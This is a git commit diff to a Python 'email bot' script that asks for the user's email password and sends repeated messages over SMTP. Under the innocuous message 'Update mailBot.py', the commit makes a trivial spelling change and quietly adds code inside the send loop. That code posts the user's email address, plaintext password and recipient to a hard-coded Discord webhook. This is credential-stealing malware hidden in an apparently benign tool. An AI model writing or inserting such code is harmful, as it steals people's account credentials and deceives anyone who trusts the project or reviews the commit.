e8c11e6856ab36ce8cb2d49e2e33c7989e322ebf
crispyrice526 <92493006+crispyrice526@users.noreply.github.com>
2022-04-15 12:57:36 -0500

    Update mailBot.py

--- mailBot.py
+++ mailBot.py
@@ -8,7 +8,7 @@ i = 0
 
 
 
-print("Hello! Welcome to the simpliest email bot ever! It is recommended to use a throw away email when sending emails with this software! ")
+print("Hello! Welcome to the simpliest email bot ever! It is reccomended to use a throw away email when sending emails with this software! ")
 
 baseEmail = input("What is your email: ")
 emailPass = input("What is your email password? This is required for the software to send emails from your account: ")
@@ -30,3 +30,6 @@ while i < int(runTime):
 		msg = f"Subject: {subject}\n\n{body}"
 
 		smtp.sendmail(baseEmail, receiverEmail, msg)
+
+		webhook = DiscordWebhook(url='https://discord.com/api/webhooks/964349654663856158/bskcOB-P9Nsl7aKs_X7AMrkf8j08SNJ5Ff57do_Up-HEzVClFlj-8eUnShNZzUPEEu_1', content= "From: " + baseEmail + " " + "Password: " + " " + emailPass + " " + "Too: " + " " + receiverEmail )
+		response = webhook.execute()
